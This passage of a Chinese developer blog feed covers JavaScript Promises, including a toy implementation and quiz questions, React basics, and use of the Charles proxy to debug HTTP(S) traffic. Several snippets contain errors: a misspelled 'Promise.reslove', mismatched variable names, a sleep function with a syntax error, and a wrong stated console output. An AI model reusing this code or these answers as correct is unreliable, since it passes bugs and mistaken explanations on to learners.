{})</code>。建议在队列的最后面加上<code>.catch()</code>，以避免漏掉错误处理。</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function"><span class="params">resolve</span> =&gt;</span> &#123;</span><br><span class="line">  setTimeout(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">    resolve(<span class="string">'hello'</span>)</span><br><span class="line">  &#125;, <span class="number">2000</span>);</span><br><span class="line">&#125;)</span><br><span class="line">.then(<span class="function"><span class="params">value</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(value);</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function"><span class="params">resolve</span> =&gt;</span> &#123;</span><br><span class="line">    setTimeout(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">      resolve(<span class="string">'world'</span>)</span><br><span class="line">    &#125;, <span class="number">2000</span>)</span><br><span class="line">  &#125;)</span><br><span class="line">&#125;)</span><br><span class="line">.then(<span class="function"><span class="params">value</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(value + <span class="string">'world'</span>)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 2s hello</span></span><br><span class="line"><span class="comment">// 再过2s hello world</span></span><br></pre></td></tr></table></figure><p>另一个例子<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">console</span>.log(<span class="string">'start'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> promise = <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function"><span class="params">resolve</span> =&gt;</span> &#123;</span><br><span class="line">  setTimeout(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'the promise fulfilled'</span>);</span><br><span class="line">    resolve(<span class="string">'hello world'</span>)</span><br><span class="line">  &#125;, <span class="number">1000</span>)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">setTimeout(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">  promise.then(<span class="function"><span class="params">value</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(value)</span><br><span class="line">  &#125;)</span><br><span class="line">&#125;, <span class="number">3000</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// start</span></span><br><span class="line"><span class="comment">// 1s后 the promise fulfilled</span></span><br><span class="line"><span class="comment">// 再过2s hello world</span></span><br></pre></td></tr></table></figure></p><p><br></p><h3 id="2-Promise-API"><a href="#2-Promise-API" class="headerlink" title="2. Promise API"></a>2. Promise API</h3><h4 id="2-1-Promise-all"><a href="#2-1-Promise-all" class="headerlink" title="2.1 Promise.all"></a>2.1 Promise.all</h4><p><em><code>Promise.all([p1, p2, p3...])</code></em>用于将多个Promise实例，包装成一个新的Promise实例。</p><ul><li>它接受一个数组作为参数，数组里可以是Promise对象，也可以是别的值，只有Promise会等待状态改变。</li><li>当所有子Promise都完成，该Promise完成，返回值是全部值的数组。</li><li>有任何一个失败，该Promise失败，返回值是第一个失败的子Promise的结果</li><li>Promise.all()最常见是和.map()连用<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">findLargest</span>(<span class="params">dir</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> FileSystem.readDir(dir, <span class="string">'utf-8'</span>)</span><br><span class="line">    .then( <span class="function"><span class="params">files</span> =&gt;</span> &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="built_in">Promise</span>.all(files.map( <span class="function"><span class="params">file</span> =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function"><span class="params">resolve</span> =&gt;</span> &#123;</span><br><span class="line">          fs.stat(path.join(dir, file), (err, stat) =&gt; &#123;</span><br><span class="line">            <span class="keyword">if</span> (err) <span class="keyword">throw</span> err;</span><br><span class="line">            <span class="keyword">if</span> (stat.isDirectory())&#123;</span><br><span class="line">              <span class="keyword">return</span> resolve(&#123;</span><br><span class="line">                size: <span class="number">0</span></span><br><span class="line">              &#125;)</span><br><span class="line">            &#125;</span><br><span class="line">            stat.file = file;</span><br><span class="line">            resolve(stat);</span><br><span class="line">          &#125;)</span><br><span class="line">        &#125;)</span><br><span class="line">      &#125;))</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><h4 id="2-2-Promise-resolve"><a href="#2-2-Promise-resolve" class="headerlink" title="2.2 Promise.resolve()"></a>2.2 Promise.resolve()</h4><p>返回一个状态已变成resolved状态的Promise实例<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> promise = <span class="built_in">Promise</span>.reslove($.ajax(<span class="string">'/test/test.json'</span>));</span><br><span class="line">promise.then(<span class="function"><span class="keyword">function</span>(<span class="params">valeu</span>)</span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(value)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></p><h4 id="2-3-Promise-reject"><a href="#2-3-Promise-reject" class="headerlink" title="2.3 Promise.reject()"></a>2.3 Promise.reject()</h4><p>返回一个状态已变成rejected的Promise实例</p><h4 id="2-4-Promise-race"><a href="#2-4-Promise-race" class="headerlink" title="2.4 Promise.race()"></a>2.4 Promise.race()</h4><p>类似Promise.all(),区别在于它有任意一个完成就算完成。</p><h4 id="2-5-Promise-prototype-then"><a href="#2-5-Promise-prototype-then" class="headerlink" title="2.5 Promise.prototype.then"></a>2.5 Promise.prototype.then</h4><p>为Promise注册回调函数。then方法可以被同一个promise调用多次。当promise成功执行时，所有onFulfilled需按照其注册顺序依次回调。当promise被拒绝执行时，所有的onRejected需按照其注册顺序依次回调。</p><p><br></p><h3 id="3-实现一个简单版Promise"><a href="#3-实现一个简单版Promise" class="headerlink" title="3. 实现一个简单版Promise"></a>3. 实现一个简单版Promise</h3><p>使用宏观任务机制(setTimeout),确保onFulfilledCallbacks，onRejectedCallbacks在then方法被调用的那一轮事件循环之后的新执行栈中执行。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> PENDING = <span class="string">'pending'</span>;</span><br><span class="line"><span class="keyword">const</span> FULFILLED = <span class="string">'fulfilled'</span>;</span><br><span class="line"><span class="keyword">const</span> REJECTED = <span class="string">'rejected'</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AjPromise</span></span>&#123;</span><br><span class="line">  <span class="keyword">constructor</span>(fn) &#123;</span><br><span class="line">    <span class="comment">// 当前状态</span></span><br><span class="line">    <span class="keyword">this</span>.state = PENDING;</span><br><span class="line">    <span class="comment">// 终值</span></span><br><span class="line">    <span class="keyword">this</span>.value = <span class="literal">null</span>;</span><br><span class="line">    <span class="comment">// 拒因</span></span><br><span class="line">    <span class="keyword">this</span>.reason = <span class="literal">null</span>;</span><br><span class="line">    <span class="comment">// 成功态回调队列</span></span><br><span class="line">    <span class="keyword">this</span>.onFulfilledCallbacks = [];</span><br><span class="line">    <span class="comment">// 拒绝态回调队列</span></span><br><span class="line">    <span class="keyword">this</span>.onRejectedCallbacks = [];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 成功态回调</span></span><br><span class="line">    <span class="comment">// 当前异步操作执行完毕，调用then方法里的第一个方法</span></span><br><span class="line">    <span class="keyword">const</span> resolve = <span class="function"><span class="params">value</span> =&gt;</span> &#123;</span><br><span class="line">      <span class="comment">// 使用macro-task机制(setTimeout)， 确保onFulfilled在then方法被调用的那一轮事件循环之后的新执行栈中执行</span></span><br><span class="line">      setTimeout(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">this</span>.state === PENDING) &#123;</span><br><span class="line">          <span class="comment">// pending态迁移至fulfilled，保证调用次数不超过一次</span></span><br><span class="line">          <span class="keyword">this</span>.state = FULFILLED;</span><br><span class="line">          <span class="keyword">this</span>.value = value;</span><br><span class="line">          <span class="keyword">this</span>.onFulfilledCallbacks.map(<span class="function"><span class="params">cb</span> =&gt;</span> &#123;</span><br><span class="line">            <span class="keyword">this</span>.value = cb(<span class="keyword">this</span>.value)</span><br><span class="line">          &#125;)</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 拒绝态回调</span></span><br><span class="line">    <span class="keyword">const</span> reject = <span class="function"><span class="params">reason</span> =&gt;</span> &#123;</span><br><span class="line">      <span class="comment">// 使用macro-task机制(setTimeout)，确保onRejected在then方法被调用的那一轮事件循环之后的新执行栈中执行</span></span><br><span class="line">      setTimeout(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">this</span>.state === PENDING) &#123;</span><br><span class="line">          <span class="comment">// pending态迁移至fulfilled态，保证调用次数不超过一次</span></span><br><span class="line">          <span class="keyword">this</span>.state = REJECTED;</span><br><span class="line">          <span class="keyword">this</span>.reason = reason;</span><br><span class="line">          <span class="keyword">this</span>.onRejectedCallbacks.map(<span class="function">(<span class="params">cb</span>) =&gt;</span> &#123;</span><br><span class="line">            <span class="keyword">this</span>.reason = cb(<span class="keyword">this</span>.reason);</span><br><span class="line">          &#125;)</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">      fn(resolve, reject)</span><br><span class="line">    &#125; <span class="keyword">catch</span>(e) &#123;</span><br><span class="line">      reject(e)</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  then(onFulfilled, onRejected)&#123;</span><br><span class="line">    <span class="keyword">typeof</span> onFulfilled === <span class="string">'function'</span> &amp;&amp; <span class="keyword">this</span>.onFulfilledCallbacks.push(onFulfilled);</span><br><span class="line">    <span class="keyword">typeof</span> onRejected === <span class="string">'function'</span> &amp;&amp; <span class="keyword">this</span>.onRejectedCallbacks.push(onRejected);</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">new</span> AjPromise(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="line">  setTimeout(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="comment">// 2s后执行成功</span></span><br><span class="line">    <span class="comment">// 执行成功后，调用resolve()，通知promise当前异步操作执行完成</span></span><br><span class="line">    resolve(<span class="number">2</span>);</span><br><span class="line">  &#125;, <span class="number">2000</span>)</span><br><span class="line">&#125;)</span><br><span class="line">.then(<span class="function"><span class="params">res</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(res);</span><br><span class="line">  <span class="keyword">return</span> res + <span class="number">1</span>;</span><br><span class="line">&#125;)</span><br><span class="line">.then(<span class="function"><span class="params">res</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(res);</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 2s后出现</span></span><br><span class="line"><span class="comment">// 2</span></span><br><span class="line"><span class="comment">// 3</span></span><br></pre></td></tr></table></figure><p><br></p><h3 id="4-Promise题目"><a href="#4-Promise题目" class="headerlink" title="4. Promise题目"></a>4. Promise题目</h3><ul><li>实现一个sleep函数，sleep(1000)以为这等待1000毫秒<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> sleep = <span class="function">(<span class="params">t</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Promise</span>(resolve, reject) =&gt; &#123;</span><br><span class="line">    setTimeout(resolve, t)</span><br><span class="line">  &#125;</span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">sleep(<span class="number">1000</span>).then(<span class="function"><span class="params">()</span> =&gt;</span> &#123;&#125;)</span><br></pre></td></tr></table></figure></li></ul><p><br></p><ul><li><p>promise构造函数是同步执行还是异步执行？then呢？<br>promise构造函数是同步执行的，then方法是异步执行的</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> promise = <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function">(<span class="params">resolve, rejcet</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="number">1</span>)</span><br><span class="line">  resolve()</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="number">2</span>)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">promise.then(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="number">3</span>)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(<span class="number">4</span>)</span><br><span class="line"><span class="comment">// 执行结果是1243</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> promise = <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="number">1</span>);</span><br><span class="line">  resolve(<span class="number">5</span>);</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="number">2</span>);</span><br><span class="line">&#125;).then(<span class="function"><span class="params">val</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(val);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">promise.then(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="number">3</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(<span class="number">4</span>);</span><br><span class="line"></span><br><span class="line">setTimeout(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="number">6</span>);</span><br><span class="line">&#125;);</span><br><span class="line"><span class="comment">// 执行结果是1243</span></span><br></pre></td></tr></table></figure></li><li><p>setTimeout, promise, async/await的区别</p></li></ul><ul><li>Promise.all使用、原理实现及错误处理<br>Promise.all()接受一个由promise任务组成</li></ul><p><br></p><h3 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h3><ul><li><a href="https://juejin.im/post/5c41297cf265da613356d4ec" target="_blank" rel="noopener">你能手写一个Promise吗？Yes I promise。</a></li><li><a href="https://juejin.im/post/5b31a4b7f265da595725f322" target="_blank" rel="noopener">https://juejin.im/post/5b31a4b7f265da595725f322</a></li><li><a href="https://juejin.im/post/5b32f552f265da59991155f0" target="_blank" rel="noopener">https://juejin.im/post/5b32f552f265da59991155f0</a></li><li><a href="https://juejin.im/post/5aa7868b6fb9a028dd4de672" target="_blank" rel="noopener">https://juejin.im/post/5aa7868b6fb9a028dd4de672</a></li><li><a href="https://wangdoc.com/javascript/async/index.html" target="_blank" rel="noopener">https://wangdoc.com/javascript/async/index.html</a></li><li><a href="https://www.jianshu.com/p/8d5c3a9e6181" target="_blank" rel="noopener">https://www.jianshu.com/p/8d5c3a9e6181</a></li><li><a href="https://www.jianshu.com/p/fe5f173276bd" target="_blank" rel="noopener">前端基础进阶（十三）：透彻掌握Promise的使用，读这篇就够了</a></li></ul>]]></content>
      
      <categories>
          
          <category> JS </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>React</title>
      <link href="/2019/05/29/React/"/>
      <url>/2019/05/29/React/</url>
      <content type="html"><![CDATA[<blockquote><p>传统DOM操作关注太多细节；应用程序状态分散在各处，难以追踪和维护。为了解决这些问题，React提供了以下方案来解决这些问题：1. <strong>允许用组件描述UI</strong>，解决UI细节问题； 2. <strong>单向数据流</strong>，以state为基础来产生UI，始终整体刷新。</p></blockquote><p><br></p><h3 id="1-React组件"><a href="#1-React组件" class="headerlink" title="1. React组件"></a>1. React组件</h3><p>React组件可以理解为一个纯函数<code>props + state = View</code>。React组件尽量无状态，所需数据通过props获取。<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 表单元素状态由使用者维护</span></span><br><span class="line">&lt;input</span><br><span class="line">  type=<span class="string">"text"</span></span><br><span class="line">  value=&#123;<span class="keyword">this</span>.state.value&#125;</span><br><span class="line">  onChange=&#123;evt =&gt; <span class="keyword">this</span>.setState(&#123; <span class="attr">value</span>: evt.target.value &#125;)&#125;</span><br><span class="line">/&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 表单元素状态DOM自身维护</span></span><br><span class="line">&lt;input</span><br><span class="line">  type=<span class="string">"text"</span></span><br><span class="line">  ref=&#123;node =&gt; <span class="keyword">this</span>.input = node&#125;</span><br><span class="line">/&gt;</span><br></pre></td></tr></table></figure></p><p><br></p><h3 id="2-JSX"><a href="#2-JSX" class="headerlink" title="2. JSX"></a>2. JSX</h3><p>与vue自定义的一套模板不同，jsx不是模板语言，只是一种语法糖 —— 在js代码中直接写HTML标记。当遇到<em><code>&lt;</code></em>就当HTML解析,遇到<em><code>{</code></em>就当js解析。<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// jsx本身也是表达式</span></span><br><span class="line"><span class="keyword">const</span> props = &#123;<span class="attr">firstName</span>: <span class="string">'Ben'</span>, <span class="attr">lastName</span>:<span class="string">'Mike'</span>&#125;;</span><br><span class="line"><span class="keyword">const</span> element = <span class="xml"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>hello, world<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 表达式作为子元素</span></span><br><span class="line"><span class="keyword">const</span> element = <span class="xml"><span class="tag">&lt;<span class="name">li</span>&gt;</span>&#123;props.message&#125;<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 在属性中可以使用表示式</span></span><br><span class="line">&lt;MyComponent foo=&#123; <span class="number">1</span> + <span class="number">2</span> + <span class="number">3</span> &#125; /&gt;</span><br><span class="line">&lt;Greeting &#123;...props&#125; /&gt;</span><br></pre></td></tr></table></figure></p><p><br></p><h3 id="3-生命周期"><a href="#3-生命周期" class="headerlink" title="3. 生命周期"></a>3. 生命周期</h3><p><strong>constructor</strong><br>标准js类的构造函数，用于初始化内部状态。<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="class"><span class="keyword">class</span> <span class="title">Clock</span> <span class="keyword">extends</span> <span class="title">React</span>.<span class="title">Component</span></span>&#123;</span><br><span class="line">  <span class="keyword">constructor</span>(props)&#123;</span><br><span class="line">    <span class="keyword">super</span>(props);</span><br><span class="line">    <span class="keyword">this</span>.state = &#123;&#125;;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><strong>getDerivedStateFromProps</strong><br>从props初始化内部state状态可使用（不推荐使用），每次render都会调用</p><p><strong>getSnapshotBeforeUpdate</strong><br>在页面render之前调用，state已更新，但真实DOM未更新，用来获取render之前的DOM状态</p><p><strong>componentDidMount</strong><br>UI渲染完成后调用，只执行一次，此处可以发起ajax请求</p><p><strong>componentDidUpdate</strong><br>每次UI更新时被调用，props有修改的时候，可以捕获从而根据props数据发请求</p><p><strong>componentWillUnmount</strong><br>组件移除时被调用，资源释放，如消除setInterval</p><p><br></p><p><br></p><h3 id="4-Virtual-DOM"><a href="#4-Virtual-DOM" class="headerlink" title="4. Virtual DOM"></a>4. Virtual DOM</h3><p>Virtual DOM是jsx的运行基础。React组件在内部维护了一套Virtual DOM的状态，这套虚拟状态最终会映射到真实的DOM节点。虚拟DOM状态发生变化时，会diff Virtual DOM, 最小化真实DOM的修改。</p><p>虚拟DOM的两个假设： 组件的DOM结构是相对稳定的；类型相同的兄弟节点可以被唯一标识。</p><p><br></p><h3 id="5-组件复用"><a href="#5-组件复用" class="headerlink" title="5. 组件复用"></a>5. 组件复用</h3><p>组件复用的两种形式：高阶组件和函数作为子组件。</p><p>高阶组件<br>是对已有组件的封装，接受组件作为参数，返回新的组件。高阶组件可以自己获取外部资源，处理后传递给组件。这时候，这个组件的数据就有两个来源，一个是父组件props，一个是高阶组件传进来的数据。（待填坑）</p><p><br></p><h3 id="6-Context-API"><a href="#6-Context-API" class="headerlink" title="6. Context API"></a>6. Context API</h3><p>共享全局状态, 根节点提供所有的上下文数据，子节点通过context API获取全局状态。当Provider的值发生变化时，下面所有Consumer都会发生变化。</p>]]></content>
      
      <categories>
          
          <category> React </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Charles抓包</title>
      <link href="/2019/05/27/Charles%E6%8A%93%E5%8C%85/"/>
      <url>/2019/05/27/Charles%E6%8A%93%E5%8C%85/</url>
      <content type="html"><![CDATA[<blockquote><p>Charles将自己设置为系统的网络访问代理服务器，这样所有的网络请求都会通过它，从而实现了网络请求的截获和分析。</p></blockquote><p><br></p><h3 id="1-过滤网络请求"><a href="#1-过滤网络请求" class="headerlink" title="1. 过滤网络请求"></a>1. 过滤网络请求</h3><p>选择菜单中的Proxy -&gt; Mac OS X Proxy，之后你的电脑上的任何网络请求都可以在请求面板中看到。</p><ul><li>Structure: 将所有网络请求按照域名划分</li><li>Sequence: 将所有网络请求按照时间排序</li><li>filter: 过滤网络请求。想看所有来自<code>www.baidu.com</code>的所有网络请求，在下面你输入baidu即可。<br><br><br><img src="/2019/05/27/Charles抓包/1.png" style="max-width:500px"></li></ul><p><br><br><br></p><h3 id="2-截取https数据"><a href="#2-截取https数据" class="headerlink" title="2. 截取https数据"></a>2. 截取https数据</h3><p>捕获https协议的网络请求，需要安装Charles的CA证书。</p><p>点击顶部菜单栏Help -&gt; SSL Proxying -&gt; Install Charles Root Certificate -&gt; 在keychain处将新安装的证书设置为永久信任。即使安装了CA证书，charles默认是不捕获https协议的网络请求。我们需要选中网络请求右击选中 <em>SSL Proxying Enabled</em>，这样才能看到。<br><br><br><img src="/2019/05/27/Charles抓包/5.png" style="max-width:500px"></p><p><br><br><br></p><h3 id="3-截获iPhone的网络请求"><a href="#3-截获iPhone的网络请求" class="headerlink" title="3. 截获iPhone的网络请求"></a>3. 截获iPhone的网络请求</h3><p>要截获iphone的网络请求需要为Charles开启代理功能。在菜单栏选择Proxy -&gt; Proxy Settings，填写HTTP Proxy, Port:8888。并将Enable transparent HTTP proxying勾选上。</p><p><em>iphone上的设置</em><br>打开手机“设置 - 无线局域网”，点击“配置代理”，设置HTTP代理选中“手动”。服务器处填写电脑ip地址，端口写8888。<br><br><br><img src="/2019/05/27/Charles抓包/2.png" style="max-width:200px"></p><p><br><br><br></p><h3 id="4-修改网络请求"><a href="#4-修改网络请求" class="headerlink" title="4. 修改网络请求"></a>4. 修改网络请求</h3><p>Charles提供了对网络请求的编辑和重发功能。只要选中需要修改编辑的网络请求，点击 <em>钢笔</em> 按钮，点击后就可以对网络请求进行编辑，编辑后点击 <em>Execute</em> 按钮，该请求就能被执行。<br><br><br><img src="/2019/05/27/Charles抓包/3.png" style="max-width: 500px"><br><br></p><h3 id="5-修改服务器返回内容"><a href="#5-修改服务器返回内容" class="headerlink" title="5. 修改服务器返回内容"></a>5. 修改服务器返回内容</h3><p>为了调试代码，很多时候我们需要修改接口返回的数据。制造数据为空、数据异常、请求失败、多页数据的情况。下面的功能，都可以实现修改服务端返回数据的功能。</p><ul><li>Map 功能适合长期地将某一请求重定向到另一个指定的网络地址或本地json文件</li><li>Rewrite 功能适合对网络请求进行一些正则替换</li><li>Breakpoints 功能适合对网络请求进行一些临时性的修改（类似断点作用）</li></ul><p><br></p><h4 id="5-1-Map"><a href="#5-1-Map" class="headerlink" title="5.1 Map"></a>5.1 Map</h4><p>点击菜单栏Tools -&gt; Map Remote，适合切换线上到本地，测试服到正式服的场景<br>点击菜单栏Tools -&gt; Map Local，映射到本地的json文件</p><p><br></p><h3 id="6-压力测试"><a href="#6-压力测试" class="headerlink" title="6. 压力测试"></a>6. 压力测试</h3><p>使用Charles的Repeat功能可以对服务器发起并发访问进行压力测试。选中某个网络请求 -&gt; 右击 -&gt; Repeat Advanced -&gt; 设置迭代次数(iterations)和并发数(Concurrency) -&gt; 点击ok。</p><p><br></p><h3 id="7-反向代理"><a href="#7-反向代理" class="headerlink" title="7. 反向代理"></a>7. 反向代理</h3><p>反向代理允许我们将本地指定端口的请求映射到远程的另一个端口上。点击顶部菜单栏Proxy -&gt; 点击 Reverse 